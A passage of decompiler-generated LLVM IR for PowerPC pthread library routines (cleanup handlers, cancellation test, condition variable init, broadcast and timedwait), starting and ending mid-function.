  %storemerge.in.in = phi i32 [ %v1_10004b88, %entry ], [ %v1_10004ba4, %dec_label_pc_10004b94 ]
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @r31, align 4
  %v3_10004ba8 = icmp eq i32 %storemerge, 0
  %tmp5 = icmp ule i32 %storemerge, %v1_10004bac
  %or.cond = or i1 %tmp5, %v3_10004ba8
  br i1 %or.cond, label %dec_label_pc_10004bb4, label %dec_label_pc_10004b94

dec_label_pc_10004bb4:                            ; preds = %dec_label_pc_10004ba8
  %v0_10004bb4 = load i32, i32* %r30.global-to-local, align 4
  %v1_10004bb4 = add i32 %v0_10004bb4, 372
  %v2_10004bb4 = inttoptr i32 %v1_10004bb4 to i32*
  %v3_10004bb4 = load i32, i32* %v2_10004bb4, align 4
  %v3_10004bb8 = icmp eq i32 %v3_10004bb4, 0
  br i1 %v3_10004bb8, label %dec_label_pc_10004bb4.dec_label_pc_10004bc4_crit_edge, label %dec_label_pc_10004bc0

dec_label_pc_10004bb4.dec_label_pc_10004bc4_crit_edge: ; preds = %dec_label_pc_10004bb4
  %v0_10004bd4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10004bc4

dec_label_pc_10004bc0:                            ; preds = %dec_label_pc_10004bb4
  store i32 268454852, i32* @lr, align 4
  %v0_10004bc0 = call i32 @__rpc_thread_destroy()
  store i32 %v0_10004bc0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10004bc4

dec_label_pc_10004bc4:                            ; preds = %dec_label_pc_10004bb4.dec_label_pc_10004bc4_crit_edge, %dec_label_pc_10004bc0
  %v0_10004bd4 = phi i32 [ %v0_10004bd4.pre, %dec_label_pc_10004bb4.dec_label_pc_10004bc4_crit_edge ], [ %v0_10004bc0, %dec_label_pc_10004bc0 ]
  ret i32 %v0_10004bd4

; uselistorder directives
  uselistorder i32 %storemerge, { 2, 3, 4, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10004bc4, { 1, 0 }
  uselistorder label %dec_label_pc_10004ba8, { 1, 0 }
}

define i32 @__pthread_cleanup_pop_restore() local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r9.global-to-local = alloca i32, align 4
  %v0_10004bd8 = load i32, i32* @r4, align 4
  %v3_10004bd8 = icmp eq i32 %v0_10004bd8, 0
  store i1 %v3_10004bd8, i1* %cr7_eq.global-to-local, align 1
  %v0_10004be8 = load i32, i32* @r3, align 4
  store i32 %v0_10004be8, i32* @r31, align 4
  %v0_10004bf0 = load i32, i32* @r2, align 4
  store i32 %v0_10004bf0, i32* @r30, align 4
  br i1 %v3_10004bd8, label %dec_label_pc_10004c08, label %dec_label_pc_10004bf8

dec_label_pc_10004bf8:                            ; preds = %entry
  %v1_10004c04 = call i32 @unknown_0()
  store i32 %v1_10004c04, i32* @r3, align 4
  %v0_10004c08.pre = load i32, i32* @r31, align 4
  %v0_10004c0c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10004c08

dec_label_pc_10004c08:                            ; preds = %entry, %dec_label_pc_10004bf8
  %v1_10004c10 = phi i32 [ %v0_10004bf0, %entry ], [ %v0_10004c0c.pre, %dec_label_pc_10004bf8 ]
  %v0_10004c08 = phi i32 [ %v0_10004be8, %entry ], [ %v0_10004c08.pre, %dec_label_pc_10004bf8 ]
  %v1_10004c08 = add i32 %v0_10004c08, 12
  %v2_10004c08 = inttoptr i32 %v1_10004c08 to i32*
  %v3_10004c08 = load i32, i32* %v2_10004c08, align 4
  %v1_10004c0c = add i32 %v1_10004c10, 66
  %v2_10004c0c = inttoptr i32 %v1_10004c0c to i8*
  %v3_10004c0c = load i8, i8* %v2_10004c0c, align 1
  %v4_10004c0c = zext i8 %v3_10004c0c to i32
  store i32 %v4_10004c0c, i32* %r9.global-to-local, align 4
  %v2_10004c10 = add i32 %v1_10004c10, 60
  %v3_10004c10 = inttoptr i32 %v2_10004c10 to i32*
  store i32 %v3_10004c08, i32* %v3_10004c10, align 4
  %v0_10004c14 = load i32, i32* %r9.global-to-local, align 4
  %v3_10004c14 = icmp eq i32 %v0_10004c14, 0
  store i1 %v3_10004c14, i1* %cr7_eq.global-to-local, align 1
  %v0_10004c18 = load i32, i32* @r31, align 4
  %v1_10004c18 = add i32 %v0_10004c18, 8
  %v2_10004c18 = inttoptr i32 %v1_10004c18 to i32*
  %v3_10004c18 = load i32, i32* %v2_10004c18, align 4
  %v1_10004c1c = trunc i32 %v3_10004c18 to i8
  %v2_10004c1c = load i32, i32* @r30, align 4
  %v3_10004c1c = add i32 %v2_10004c1c, 65
  %v4_10004c1c = inttoptr i32 %v3_10004c1c to i8*
  store i8 %v1_10004c1c, i8* %v4_10004c1c, align 1
  %v0_10004c20 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004c20, label %dec_label_pc_10004c44, label %dec_label_pc_10004c24

dec_label_pc_10004c24:                            ; preds = %dec_label_pc_10004c08
  %v0_10004c24 = load i32, i32* @r30, align 4
  %v1_10004c24 = add i32 %v0_10004c24, 64
  %v2_10004c24 = inttoptr i32 %v1_10004c24 to i32*
  %v3_10004c24 = load i32, i32* %v2_10004c24, align 4
  store i32 65536, i32* %r9.global-to-local, align 4
  %v1_10004c2c = call i32 @__asm_rlwinm(i32 %v3_10004c24, i32 0, i32 0, i32 15)
  %v4_10004c30 = icmp eq i32 %v1_10004c2c, 65536
  store i1 %v4_10004c30, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10004c30, label %dec_label_pc_10004c38, label %dec_label_pc_10004c44

dec_label_pc_10004c38:                            ; preds = %dec_label_pc_10004c24
  %v0_10004c40 = call i32 @__pthread_do_exit()
  store i32 %v0_10004c40, i32* @r3, align 4
  br label %dec_label_pc_10004c44

dec_label_pc_10004c44:                            ; preds = %dec_label_pc_10004c24, %dec_label_pc_10004c08, %dec_label_pc_10004c38
  %v0_10004c54 = load i32, i32* @r3, align 4
  ret i32 %v0_10004c54

; uselistorder directives
  uselistorder label %dec_label_pc_10004c44, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10004c08, { 1, 0 }
}

define i32 @__pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v0_10004c5c = load i32, i32* @r2, align 4
  store i32 %v0_10004c5c, i32* %r9.global-to-local, align 4
  %v2_10004c60 = add i32 %tmp, 4
  %v3_10004c60 = inttoptr i32 %v2_10004c60 to i32*
  store i32 %arg3, i32* %v3_10004c60, align 4
  %v0_10004c64 = load i32, i32* @r2, align 4
  %v1_10004c64 = add i32 %v0_10004c64, 65
  %v2_10004c64 = inttoptr i32 %v1_10004c64 to i8*
  %v3_10004c64 = load i8, i8* %v2_10004c64, align 1
  %v4_10004c64 = zext i8 %v3_10004c64 to i32
  store i32 %v4_10004c64, i32* %r0.global-to-local, align 4
  %v2_10004c68 = add i32 %tmp, 8
  %v3_10004c68 = inttoptr i32 %v2_10004c68 to i32*
  store i32 %v4_10004c64, i32* %v3_10004c68, align 4
  %v0_10004c6c = load i32, i32* @r2, align 4
  %v1_10004c6c = add i32 %v0_10004c6c, 60
  %v2_10004c6c = inttoptr i32 %v1_10004c6c to i32*
  %v3_10004c6c = load i32, i32* %v2_10004c6c, align 4
  store i32 %v3_10004c6c, i32* %r0.global-to-local, align 4
  %v2_10004c78 = add i32 %tmp, 12
  %v3_10004c78 = inttoptr i32 %v2_10004c78 to i32*
  store i32 %v3_10004c6c, i32* %v3_10004c78, align 4
  %tmp1 = add i32 %v3_10004c6c, -1
  %tmp2 = icmp ult i32 %tmp1, %tmp
  br i1 %tmp2, label %dec_label_pc_10004c84, label %dec_label_pc_10004c8c

dec_label_pc_10004c84:                            ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %v3_10004c78, align 4
  br label %dec_label_pc_10004c8c

dec_label_pc_10004c8c:                            ; preds = %entry, %dec_label_pc_10004c84
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10004c90 = load i32, i32* %r9.global-to-local, align 4
  %v2_10004c90 = add i32 %v1_10004c90, 60
  %v3_10004c90 = inttoptr i32 %v2_10004c90 to i32*
  store i32 %tmp, i32* %v3_10004c90, align 4
  %v0_10004c94 = load i32, i32* %r0.global-to-local, align 4
  %v1_10004c94 = trunc i32 %v0_10004c94 to i8
  %v2_10004c94 = load i32, i32* %r9.global-to-local, align 4
  %v3_10004c94 = add i32 %v2_10004c94, 65
  %v4_10004c94 = inttoptr i32 %v3_10004c94 to i8*
  store i8 %v1_10004c94, i8* %v4_10004c94, align 1
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 4, 3, 0, 5, 2, 1 }
  uselistorder label %dec_label_pc_10004c8c, { 1, 0 }
}

define i32 @_pthread_cleanup_pop(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v3_10004c9c = icmp eq i32 %arg2, 0
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v0_10004cb4 = load i32, i32* @r2, align 4
  store i32 %v0_10004cb4, i32* @r30, align 4
  br i1 %v3_10004c9c, label %dec_label_pc_10004ccc, label %dec_label_pc_10004cbc

dec_label_pc_10004cbc:                            ; preds = %entry
  %v1_10004cc0 = add i32 %tmp, 4
  %v2_10004cc0 = inttoptr i32 %v1_10004cc0 to i32*
  %v3_10004cc0 = load i32, i32* %v2_10004cc0, align 4
  store i32 %v3_10004cc0, i32* %r3.global-to-local, align 4
  %v1_10004cc8 = call i32 @unknown_0()
  store i32 %v1_10004cc8, i32* %r3.global-to-local, align 4
  %v0_10004ccc.pre = load i32, i32* %r31.global-to-local, align 4
  %v1_10004cd0.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10004ccc

dec_label_pc_10004ccc:                            ; preds = %entry, %dec_label_pc_10004cbc
  %v1_10004cd0 = phi i32 [ %v0_10004cb4, %entry ], [ %v1_10004cd0.pre, %dec_label_pc_10004cbc ]
  %v0_10004ccc = phi i32 [ %tmp, %entry ], [ %v0_10004ccc.pre, %dec_label_pc_10004cbc ]
  %v1_10004ccc = add i32 %v0_10004ccc, 12
  %v2_10004ccc = inttoptr i32 %v1_10004ccc to i32*
  %v3_10004ccc = load i32, i32* %v2_10004ccc, align 4
  %v2_10004cd0 = add i32 %v1_10004cd0, 60
  %v3_10004cd0 = inttoptr i32 %v2_10004cd0 to i32*
  store i32 %v3_10004ccc, i32* %v3_10004cd0, align 4
  %v0_10004ce4 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10004ce4

; uselistorder directives
  uselistorder i32 %tmp, { 2, 1, 0, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10004ccc, { 1, 0 }
}

define i32 @_pthread_cleanup_push(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v0_10004cec = load i32, i32* @r2, align 4
  store i32 %v0_10004cec, i32* @r9, align 4
  %v2_10004cf0 = add i32 %tmp, 4
  %v3_10004cf0 = inttoptr i32 %v2_10004cf0 to i32*
  store i32 %arg3, i32* %v3_10004cf0, align 4
  %v0_10004cf4 = load i32, i32* @r2, align 4
  %v1_10004cf4 = add i32 %v0_10004cf4, 60
  %v2_10004cf4 = inttoptr i32 %v1_10004cf4 to i32*
  %v3_10004cf4 = load i32, i32* %v2_10004cf4, align 4
  %v2_10004d00 = add i32 %tmp, 12
  %v3_10004d00 = inttoptr i32 %v2_10004d00 to i32*
  %tmp1 = add i32 %v3_10004cf4, -1
  %tmp2 = icmp ult i32 %tmp1, %tmp
  br i1 %tmp2, label %dec_label_pc_10004d0c, label %dec_label_pc_10004d14

dec_label_pc_10004d0c:                            ; preds = %entry
  br label %dec_label_pc_10004d14

dec_label_pc_10004d14:                            ; preds = %entry, %dec_label_pc_10004d0c
  %storemerge = phi i32 [ 0, %dec_label_pc_10004d0c ], [ %v3_10004cf4, %entry ]
  store i32 %storemerge, i32* %v3_10004d00, align 4
  %v1_10004d14 = load i32, i32* @r9, align 4
  %v2_10004d14 = add i32 %v1_10004d14, 60
  %v3_10004d14 = inttoptr i32 %v2_10004d14 to i32*
  store i32 %tmp, i32* %v3_10004d14, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 4, 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_10004d14, { 1, 0 }
}

define i32 @pthread_testcancel(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10004d28 = load i32, i32* @r2, align 4
  %v1_10004d28 = add i32 %v0_10004d28, 66
  %v2_10004d28 = inttoptr i32 %v1_10004d28 to i8*
  %v3_10004d28 = load i8, i8* %v2_10004d28, align 1
  %v3_10004d2c = icmp eq i8 %v3_10004d28, 0
  br i1 %v3_10004d2c, label %dec_label_pc_10004d4c, label %dec_label_pc_10004d34

dec_label_pc_10004d34:                            ; preds = %entry
  %v1_10004d34 = add i32 %v0_10004d28, 64
  %v2_10004d34 = inttoptr i32 %v1_10004d34 to i8*
  %v3_10004d34 = load i8, i8* %v2_10004d34, align 1
  %v3_10004d38 = icmp eq i8 %v3_10004d34, 0
  br i1 %v3_10004d38, label %dec_label_pc_10004d40, label %dec_label_pc_10004d4c

dec_label_pc_10004d40:                            ; preds = %dec_label_pc_10004d34
  %v0_10004d48 = call i32 @__pthread_do_exit()
  br label %dec_label_pc_10004d4c

dec_label_pc_10004d4c:                            ; preds = %dec_label_pc_10004d34, %entry, %dec_label_pc_10004d40
  %.0 = phi i32 [ undef, %entry ], [ %v0_10004d48, %dec_label_pc_10004d40 ], [ undef, %dec_label_pc_10004d34 ]
  ret i32 %.0

; uselistorder directives
  uselistorder label %dec_label_pc_10004d4c, { 2, 0, 1 }
}

define i32 @enqueue(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10004d5c = add i32 %arg1, 24
  %v2_10004d5c = inttoptr i32 %v1_10004d5c to i32*
  %v3_10004d5c = load i32, i32* %v2_10004d5c, align 4
  store i32 %v3_10004d5c, i32* @r11, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @remove_from_queue(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10004db4.pre = load i32, i32* @r3, align 4
  %v1_10004db421 = inttoptr i32 %v0_10004db4.pre to i32*
  %v2_10004db422 = load i32, i32* %v1_10004db421, align 4
  store i32 %v2_10004db422, i32* %r9.global-to-local, align 4
  %v3_10004db825 = icmp eq i32 %v2_10004db422, 0
  br i1 %v3_10004db825, label %dec_label_pc_10004dc4, label %dec_label_pc_10004d94

dec_label_pc_10004d94:                            ; preds = %entry, %dec_label_pc_10004db0
  %v2_10004db4.pn = phi i32 [ %v2_10004db4, %dec_label_pc_10004db0 ], [ %v2_10004db422, %entry ]
  %v2_10004db430 = phi i32 [ %v2_10004db4, %dec_label_pc_10004db0 ], [ %v2_10004db422, %entry ]
  %v1_10004db429 = phi i32* [ %v1_10004db4, %dec_label_pc_10004db0 ], [ %v1_10004db421, %entry ]
  %v4_10004dbc35 = icmp eq i32 %v2_10004db4.pn, %arg1
  %v1_10004d98 = add i32 %v2_10004db430, 8
  br i1 %v4_10004dbc35, label %dec_label_pc_10004d98, label %dec_label_pc_10004db0

dec_label_pc_10004d98:                            ; preds = %dec_label_pc_10004d94
  %v2_10004d98 = inttoptr i32 %v1_10004d98 to i32*
  %v3_10004d98 = load i32, i32* %v2_10004d98, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  store i32 %v3_10004d98, i32* %v1_10004db429, align 4
  %v1_10004da8 = load i32, i32* %r9.global-to-local, align 4
  %v2_10004da8 = add i32 %v1_10004da8, 8
  %v3_10004da8 = inttoptr i32 %v2_10004da8 to i32*
  store i32 0, i32* %v3_10004da8, align 4
  %v0_10004dc8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10004dc8

dec_label_pc_10004db0:                            ; preds = %dec_label_pc_10004d94
  %v1_10004db4 = inttoptr i32 %v1_10004d98 to i32*
  %v2_10004db4 = load i32, i32* %v1_10004db4, align 4
  store i32 %v2_10004db4, i32* %r9.global-to-local, align 4
  %v3_10004db8 = icmp eq i32 %v2_10004db4, 0
  br i1 %v3_10004db8, label %dec_label_pc_10004dc4, label %dec_label_pc_10004d94

dec_label_pc_10004dc4:                            ; preds = %dec_label_pc_10004db0, %entry
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10004dc8

dec_label_pc_10004dc8:                            ; preds = %dec_label_pc_10004d98, %dec_label_pc_10004dc4
  %v0_10004dc8 = phi i32 [ %v0_10004dc8.pre, %dec_label_pc_10004d98 ], [ 0, %dec_label_pc_10004dc4 ]
  ret i32 %v0_10004dc8

; uselistorder directives
  uselistorder i32 %v2_10004db4, { 2, 3, 0, 1 }
  uselistorder i32* %v1_10004db4, { 1, 0 }
  uselistorder i32 %v1_10004d98, { 1, 0 }
  uselistorder i32 %v2_10004db422, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10004dc8, { 1, 0 }
  uselistorder label %dec_label_pc_10004d94, { 1, 0 }
}

define i32 @pthread_cond_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10004dd4 = add i32 %tmp, 8
  %v3_10004dd4 = inttoptr i32 %v2_10004dd4 to i32*
  store i32 0, i32* %v3_10004dd4, align 4
  %v0_10004dd8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10004dd8, i32* %arg1, align 4
  %v2_10004ddc = add i32 %tmp, 4
  %v3_10004ddc = inttoptr i32 %v2_10004ddc to i32*
  store i32 %v0_10004dd8, i32* %v3_10004ddc, align 4
  ret i32 0
}

define i32 @__GI_pthread_cond_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10004de8 = add i32 %arg1, 8
  %v2_10004de8 = inttoptr i32 %v1_10004de8 to i32*
  %v3_10004de8 = load i32, i32* %v2_10004de8, align 4
  %v2_10004dec = icmp ne i32 %v3_10004de8, 0
  %v1_10004df4 = select i1 %v2_10004dec, i32 16, i32 0
  ret i32 %v1_10004df4
}

define i32 @pthread_condattr_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__GI_pthread_condattr_destroy() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @pthread_condattr_getpshared(i32* %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* %arg1, align 4
  ret i32 0
}

define i32 @pthread_condattr_setpshared(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10004e1c = icmp eq i32 %arg1, 0
  %v2_10004e1c = icmp ugt i32 %arg1, 1
  %v0_10004e2c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10004e1c, i32 %v0_10004e2c)
  %v1_10004e34 = select i1 %v1_10004e1c, i32 0, i32 38
  ret i32 %v1_10004e34
}

define i32 @__pthread_set_own_extricate_if(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10004e3c = call i32 @__asm_mfcr()
  store i32 %v0_10004e3c, i32* %r3.global-to-local, align 4
  %v3_10004e40 = icmp eq i32 %arg2, 0
  store i1 %v3_10004e40, i1* %cr4_eq.global-to-local, align 1
  store i32 %arg2, i32* @r30, align 4
  store i32 %v0_10004e3c, i32* @r31, align 4
  store i32 %v0_10004e3c, i32* @r4, align 4
  br i1 %v3_10004e40, label %dec_label_pc_10004e80, label %dec_label_pc_10004e68

dec_label_pc_10004e68:                            ; preds = %entry
  %v1_10004e68 = add i32 %v0_10004e3c, 64
  %v2_10004e68 = inttoptr i32 %v1_10004e68 to i8*
  %v3_10004e68 = load i8, i8* %v2_10004e68, align 1
  %v3_10004e6c = icmp eq i8 %v3_10004e68, 0
  br i1 %v3_10004e6c, label %dec_label_pc_10004e80.thread, label %dec_label_pc_10004e90

dec_label_pc_10004e80.thread:                     ; preds = %dec_label_pc_10004e68
  %v2_10004e804 = add i32 %v0_10004e3c, 444
  %v3_10004e805 = inttoptr i32 %v2_10004e804 to i32*
  store i32 %arg2, i32* %v3_10004e805, align 4
  br label %dec_label_pc_10004e90

dec_label_pc_10004e80:                            ; preds = %entry
  %v1_10004e78 = add i32 %v0_10004e3c, 28
  %v2_10004e78 = inttoptr i32 %v1_10004e78 to i32*
  %v3_10004e78 = load i32, i32* %v2_10004e78, align 4
  store i32 %v3_10004e78, i32* @r3, align 4
  store i32 268455552, i32* @lr, align 4
  %v0_10004e7c = call i32 @__pthread_lock()
  store i32 %v0_10004e7c, i32* %r3.global-to-local, align 4
  %v0_10004e80.pre = load i32, i32* @r30, align 4
  %v1_10004e80.pre = load i32, i32* @r31, align 4
  %v0_10004e84.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  %v2_10004e80 = add i32 %v1_10004e80.pre, 444
  %v3_10004e80 = inttoptr i32 %v2_10004e80 to i32*
  store i32 %v0_10004e80.pre, i32* %v3_10004e80, align 4
  br i1 %v0_10004e84.pre, label %dec_label_pc_10004e88, label %dec_label_pc_10004e90

dec_label_pc_10004e88:                            ; preds = %dec_label_pc_10004e80
  %v0_10004e88 = load i32, i32* @r31, align 4
  %v1_10004e88 = add i32 %v0_10004e88, 28
  %v2_10004e88 = inttoptr i32 %v1_10004e88 to i32*
  %v3_10004e88 = load i32, i32* %v2_10004e88, align 4
  store i32 %v3_10004e88, i32* @r3, align 4
  store i32 268455568, i32* @lr, align 4
  %v0_10004e8c = call i32 @__pthread_unlock()
  store i32 %v0_10004e8c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10004e90

dec_label_pc_10004e90:                            ; preds = %dec_label_pc_10004e80.thread, %dec_label_pc_10004e80, %dec_label_pc_10004e68, %dec_label_pc_10004e88
  %v1_10004ea0 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10004e3c)
  %v9_10004ea0 = extractvalue %0 %v1_10004ea0, 7
  store i4 %v9_10004ea0, i4* @cr4, align 1
  %v0_10004ea8 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10004ea8

; uselistorder directives
  uselistorder i32 %v0_10004e3c, { 5, 4, 0, 3, 2, 1, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_10004e90, { 3, 1, 0, 2 }
}

define i32 @restart(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268455612, i32* @lr, align 4
  %v0_10004eb8 = call i32 @__pthread_restart_new()
  ret i32 %v0_10004eb8
}

define i32 @pthread_cond_broadcast(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_10004ee8.183 to i32), i32* @lr, align 4
  %v0_10004ee4 = call i32 @__pthread_lock()
  %v0_10004eec = load i32, i32* @r29, align 4
  %v1_10004eec = add i32 %v0_10004eec, 8
  %v2_10004eec = inttoptr i32 %v1_10004eec to i32*
  %v3_10004eec = load i32, i32* %v2_10004eec, align 4
  store i32 %v3_10004eec, i32* @r31, align 4
  store i32 0, i32* %v2_10004eec, align 4
  %v0_10004ef4 = load i32, i32* @r29, align 4
  store i32 %v0_10004ef4, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10004efc.184 to i32), i32* @lr, align 4
  %v0_10004ef8 = call i32 @__pthread_unlock()
  %v0_10004f241 = load i32, i32* @r31, align 4
  %v3_10004f244 = icmp eq i32 %v0_10004f241, 0
  br i1 %v3_10004f244, label %dec_label_pc_10004f2c, label %dec_label_pc_10004f00

dec_label_pc_10004f00:                            ; preds = %entry, %dec_label_pc_10004f00
  %v0_10004f04 = phi i32 [ %v0_10004f24, %dec_label_pc_10004f00 ], [ %v0_10004f241, %entry ]
  %v1_10004f04 = add i32 %v0_10004f04, 8
  %v2_10004f04 = inttoptr i32 %v1_10004f04 to i32*
  %v3_10004f04 = load i32, i32* %v2_10004f04, align 4
  store i32 %v3_10004f04, i32* @r29, align 4
  %v3_10004f08 = add i32 %v0_10004f04, 441
  %v4_10004f08 = inttoptr i32 %v3_10004f08 to i8*
  store i8 1, i8* %v4_10004f08, align 1
  %v1_10004f10 = load i32, i32* @r31, align 4
  %v2_10004f10 = add i32 %v1_10004f10, 8
  %v3_10004f10 = inttoptr i32 %v2_10004f10 to i32*
  store i32 0, i32* %v3_10004f10, align 4
  %v0_10004f18 = load i32, i32* @r31, align 4
  store i32 %v0_10004f18, i32* @r3, align 4
  %v0_10004f1c = load i32, i32* @r29, align 4
  store i32 %v0_10004f1c, i32* @r31, align 4
  store i32 268455716, i32* @lr, align 4
  %v1_10004f20 = call i32 @restart(i32 %v0_10004f18)
  %v0_10004f24 = load i32, i32* @r31, align 4
  %v3_10004f24 = icmp eq i32 %v0_10004f24, 0
  br i1 %v3_10004f24, label %dec_label_pc_10004f2c, label %dec_label_pc_10004f00

dec_label_pc_10004f2c:                            ; preds = %dec_label_pc_10004f00, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_10004f24, { 1, 0 }
  uselistorder i32 %v0_10004f04, { 1, 0 }
  uselistorder label %dec_label_pc_10004f00, { 1, 0 }
}

define i32 @suspend.1(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268455764, i32* @lr, align 4
  %v0_10004f50 = call i32 @__pthread_wait_for_restart_signal()
  ret i32 %v0_10004f50
}

define i32 @__GI_pthread_cond_timedwait(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  store i32 %arg3, i32* @r27, align 4
  %v1_10004f80 = add i32 %arg2, 12
  %v2_10004f80 = inttoptr i32 %v1_10004f80 to i32*
  %v3_10004f80 = load i32, i32* %v2_10004f80, align 4
  %v0_10004f84 = load i32, i32* @r2, align 4
  %v3_10004f88 = icmp eq i32 %v3_10004f80, 3
  br i1 %v3_10004f88, label %dec_label_pc_10004fac, label %dec_label_pc_10004f90

dec_label_pc_10004f90:                            ; preds = %entry
  %v3_10004f90 = icmp eq i32 %v3_10004f80, 0
  br i1 %v3_10004f90, label %dec_label_pc_10004fac, label %dec_label_pc_10004f98

dec_label_pc_10004f98:                            ; preds = %dec_label_pc_10004f90
  %v1_10004fa0 = add i32 %arg2, 8
  %v2_10004fa0 = inttoptr i32 %v1_10004fa0 to i32*
  %v3_10004fa0 = load i32, i32* %v2_10004fa0, align 4
  %v4_10004fa4 = icmp eq i32 %v3_10004fa0, %v0_10004f84
  br i1 %v4_10004fa4, label %dec_label_pc_10004fac, label %dec_label_pc_10005144

dec_label_pc_10004fac:                            ; preds = %dec_label_pc_10004f98, %dec_label_pc_10004f90, %entry
  store i32 %v0_10004f84, i32* @r11, align 4
  %v2_10004fc0 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v3_10004fc8 = add i32 %v0_10004f84, 441
  %v4_10004fc8 = inttoptr i32 %v3_10004fc8 to i8*
  store i8 0, i8* %v4_10004fc8, align 1
  store i32 268455892, i32* @lr, align 4
  %v2_10004fd0 = call i32 @__pthread_set_own_extricate_if(i32 %v0_10004f84, i32 %v2_10004fc0)
  %v0_10004fd4 = load i32, i32* @r31, align 4
  store i32 %v0_10004fd4, i32* @r3, align 4
  store i32 %v0_10004f84, i32* @r4, align 4
  store i32 268455904, i32* @lr, align 4
  %v0_10004fdc = call i32 @__pthread_lock()
  store i32 %v0_10004f84, i32* @r9, align 4
  %v1_10004fe4 = add i32 %v0_10004f84, 66
  %v2_10004fe4 = inttoptr i32 %v1_10004fe4 to i8*
  %v3_10004fe4 = load i8, i8* %v2_10004fe4, align 1
  %v3_10004fe8 = icmp eq i8 %v3_10004fe4, 0
  br i1 %v3_10004fe8, label %dec_label_pc_10005004, label %dec_label_pc_10004ff0

dec_label_pc_10004ff0:                            ; preds = %dec_label_pc_10004fac
  store i32 %v0_10004f84, i32* @r9, align 4
  store i32 1, i32* @r29, align 4
  %v1_10004ff8 = add i32 %v0_10004f84, 64
  %v2_10004ff8 = inttoptr i32 %v1_10004ff8 to i8*
  %v3_10004ff8 = load i8, i8* %v2_10004ff8, align 1
  %v3_10004ffc = icmp eq i8 %v3_10004ff8, 0
  br i1 %v3_10004ffc, label %dec_label_pc_10005014, label %dec_label_pc_10005004

dec_label_pc_10005004:                            ; preds = %dec_label_pc_10004ff0, %dec_label_pc_10004fac
  %v0_10005008 = load i32, i32* @r31, align 4
  %v1_10005008 = add i32 %v0_10005008, 8
  store i32 0, i32* @r29, align 4
  %v2_10005010 = call i32 @enqueue(i32 %v1_10005008, i32 %v0_10004f84)
  br label %dec_label_pc_10005014

dec_label_pc_10005014:                            ; preds = %dec_label_pc_10004ff0, %dec_label_pc_10005004
  %v0_10005014 = load i32, i32* @r31, align 4
